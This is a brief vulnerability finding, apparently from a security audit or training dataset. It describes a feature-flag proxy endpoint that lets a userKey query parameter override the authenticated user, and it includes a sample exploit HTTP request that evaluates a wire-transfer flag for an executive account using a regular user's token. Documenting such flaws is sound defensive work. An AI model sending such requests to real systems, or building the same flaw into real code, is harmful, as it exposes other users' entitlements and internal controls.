diagnosis: The endpoint proxies LaunchDarkly feature flag evaluations for mobile clients. It accepts userKey from query parameters and prioritizes it over req.user.id. Any user can evaluate beta flags, internal administrative toggles, and feature entitlements for target users or executives.
exploit_request:
GET /api/flags/evaluate?flagKey=enable-enterprise-wire-transfers&userKey=usr_executive_vip_001 HTTP/1.1
Host: api.mobilefintech.com
Authorization: Bearer <regular_user_jwt>
